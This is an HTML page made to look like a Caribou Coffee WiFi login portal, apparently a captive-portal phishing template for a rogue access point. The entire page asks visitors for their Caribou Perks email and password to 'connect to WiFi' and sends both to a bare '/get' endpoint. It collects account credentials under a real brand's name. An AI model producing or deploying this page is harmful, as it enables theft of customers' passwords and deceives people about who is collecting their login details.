<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Caribou Coffee WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#4A3728;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 12px 50px rgba(0,0,0,0.35)}
.top{background:#4A3728;padding:26px 24px 18px;text-align:center}
.animal{font-size:36px;margin-bottom:8px}
.brand{font-size:22px;font-weight:800;color:#E8D5B0;letter-spacing:1px;text-transform:uppercase}
.tagline{font-size:9.5px;color:rgba(232,213,176,0.6);letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.mid{background:#3a2818;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#E8D5B0;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:#7a6050}
.mid strong{color:#E8D5B0;font-weight:500}
.body{padding:24px}
h2{font-size:17px;font-weight:700;color:#4A3728;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0d8cc;border-radius:8px;font-size:14.5px;background:#faf8f4;color:#1a1a1a;font-family:inherit}
input:focus{outline:none;border-color:#4A3728}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#4A3728;color:#E8D5B0;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#4A3728}
.foot{background:#faf8f4;border-top:1px solid #e0d8cc;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
.foot a{color:#4A3728}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="animal">🦌</div>
    <div class="brand">Caribou Coffee</div>
    <div class="tagline">Life Is Short. Stay Awake For It.</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>Caribou_WiFi</strong></span></div>
  <div class="body">
    <h2>Welcome, Coffee Lover</h2>
    <p class="sub">Sign in with your Caribou Perks account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to WiFi</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Caribou Coffee</span><a href="#">Help</a></div>
</div>
</body>
</html>
